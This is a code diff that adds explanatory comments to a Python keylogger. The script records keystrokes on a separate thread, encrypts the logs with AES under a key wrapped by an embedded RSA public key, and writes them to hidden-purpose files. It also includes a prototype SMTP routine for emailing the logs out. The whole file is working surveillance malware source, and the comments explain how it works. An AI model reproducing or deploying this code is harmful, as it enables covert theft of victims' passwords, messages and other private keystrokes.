@@ -1,19 +1,20 @@
 #/usr/bin/python3
-import pyaes
-import os
-from logger import Logger
-import time 
-from Crypto.PublicKey import RSA
-import sys
+import pyaes                                                              # Only for AES 
+import os                                                                 # AES Random Number Generation using os.urandom
+from logger import Logger                                                 # Logger Runs on Seperate Thread
+import time                                                               
+from Crypto.PublicKey import RSA                                          # To Encrypt AES Key 
+import sys                                                                   
 
-#fw = open('public_key.pem','r')
-#public_key = fw.read()
-#fw.close()
+#fw = open('public_key.pem','r')                # Optionally the Public key can be read from a file or any 
+#public_key = fw.read()                         # online link, but as public key exposure is not very harmful
+#fw.close()                                     # it is okay to store it in source. even though it can be 
+                                                # reverse engineered!
 
-USER_ID = '#Host or temp email id '
+USER_ID = '#Host or temp email id '             # Prototype Email Functionality Login credentials
 PASSWD  = '#host password'
 
-def send_email(recipient, subject, body):
+def send_email(recipient, subject, body):       # Prototype Function to Send Email from host using SSL
     import smtplib
     FROM = USER_ID
     TO = recipient 
@@ -30,6 +31,8 @@ def send_email(recipient, subject, body):
         server_ssl.close()
     except:
         pass
+    
+#Public key of RSA To encrypt the AES Key
 
 public_key = '''-----BEGIN PUBLIC KEY-----
 MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvapqD4ZpP4P8FDVisTif
@@ -46,26 +49,27 @@ T6juxXmjz5L+7aazqwGr2/HMrt6hMHczv9UR2rKjMKiuef0hhKyFjHJ80HzubKIN
 rleEd/m4Ab7BvcCcXd7fYusCAwEAAQ==
 -----END PUBLIC KEY-----'''
 
+#The OOP Approach
 class KeyLogger:
     def __init__(self,RSA_PUBLIC_KEY,LOG_FILE_NAME='LogFile.bin',KEY_FILE_NAME='AESKey.bin'):
-        self.init_RSA_Object(RSA_PUBLIC_KEY)
-        self.logfile = LOG_FILE_NAME
-        self.KEY_FILE_NAME = KEY_FILE_NAME
+        self.init_RSA_Object(RSA_PUBLIC_KEY)  # Initialize a RSA Public Key object that can encrypt data
+        self.logfile = LOG_FILE_NAME          # Logfile to store Logs
+        self.KEY_FILE_NAME = KEY_FILE_NAME    # Keyfile to store RSA Encrypted AES Key 
 
-        self.aes = self.generate_AES_Object()
+        self.aes = self.generate_AES_Object() # Generates an AES Object that encrypts logs
         
-        self.file = open(self.logfile,'wb')
-        self.Handle = Logger()
-        self.Handle.start()
+        self.file = open(self.logfile,'wb')   
+        self.Handle = Logger()                
+        self.Handle.start()                  # start logging on seperate thread
         
     def init_RSA_Object(self,public_key):
         #print("RSA Onject Initialized")
-        self.pub_key = RSA.importKey(public_key)
+        self.pub_key = RSA.importKey(public_key)  # RSA Public Key Object
 
     def export_AES_key(self,key):
         #print("Exporting AES Key")
         fw = open(self.KEY_FILE_NAME,'wb')
-        enc = self.RSA_Encrypt(self.AES_KEY)
+        enc = self.RSA_Encrypt(self.AES_KEY)      # AES Key is exported after getting encrypted by RSA Public key
         fw.write(enc)
         fw.close()
 
@@ -74,27 +78,27 @@ class KeyLogger:
         enc = self.pub_key.encrypt(data,32)[0]
         return enc
 
-    def generate_AES_Object(self):
+    def generate_AES_Object(self):                 # generate random AES Key and AES Object
         self.AES_KEY = os.urandom(32) #256 Bits AES
-        self.export_AES_key(self.AES_KEY)
+        self.export_AES_key(self.AES_KEY)           
         #print(self.AES_KEY)
         aes = pyaes.AESModeOfOperationCTR(self.AES_KEY)
         return aes
     
     def start(self):
         while True:
-            self.new_logs = self.Handle.export_log()
-            if (len(self.new_logs) != 0):
-                self.Handle.clear_log()
-                for self.log in self.new_logs:
+            self.new_logs = self.Handle.export_log()  # get current logs
+            if (len(self.new_logs) != 0):            
+                self.Handle.clear_log() 
+                for self.log in self.new_logs:           
                     #print(self.log)
-                    self.enc_log = self.aes.encrypt(str(self.log).encode())
+                    self.enc_log = self.aes.encrypt(str(self.log).encode()) 
                     #print(self.enc_log)
-                    del self.new_logs[0]
-                    self.file.write(self.enc_log)
+                    del self.new_logs[0]              # delete log from list to save RAM and increase Security
+                    self.file.write(self.enc_log)     # Write to logfile
 
     def __del__(self):
-        self.file.close()
+        self.file.close()                             # logfile is closed when __del__ is called in the end
 
 X = KeyLogger(public_key)
-X.start()
+X.start()                                             # ..Starts Logging Data..
